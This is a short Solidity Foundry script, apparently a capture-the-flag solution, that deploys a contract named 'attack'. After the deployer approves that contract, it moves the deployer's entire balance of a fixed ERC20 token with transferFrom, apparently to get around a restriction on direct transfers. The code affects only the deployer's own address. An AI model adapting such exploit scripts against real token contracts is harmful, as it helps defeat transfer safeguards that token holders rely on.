//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract attack {
    IERC20 token = IERC20(0xB5d2fD0ef3399e729E552947c0eE44504F0eD5bC);
    address me = 0x4948F43e559A38C1fDbeB2d7C5476d3c0Bda15E7;

    function spend() public {
        token.transferFrom(me, address(this), token.balanceOf(me));
    }
}

contract deployAttack is Script {
    IERC20 token = IERC20(0xB5d2fD0ef3399e729E552947c0eE44504F0eD5bC);
    address me = 0x4948F43e559A38C1fDbeB2d7C5476d3c0Bda15E7;

    function run() public {
        vm.startBroadcast();
        attack Attack = new attack();
        token.approve(address(Attack), token.balanceOf(me));
        Attack.spend();
        console.log(token.balanceOf(me));
    }
}
